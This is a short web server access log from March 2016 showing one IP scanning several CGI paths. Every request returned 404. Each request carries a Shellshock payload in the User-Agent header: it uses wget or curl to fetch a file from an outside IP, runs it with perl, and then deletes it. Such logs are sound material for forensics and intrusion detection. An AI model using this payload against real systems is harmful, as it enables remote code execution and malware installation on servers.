119.188.4.3 - - [14/Mar/2016:21:54:48 -0700] "GET /cgi-bin/test.sh HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:48 -0700] "GET /cgi-sys/FormMail-clone.cgi HTTP/1.1" 404 478 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:49 -0700] "GET /xul/ HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:49 -0700] "GET /cgi-bin/status HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:50 -0700] "GET /tmUnblock.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:51 -0700] "GET /gitweb/ HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
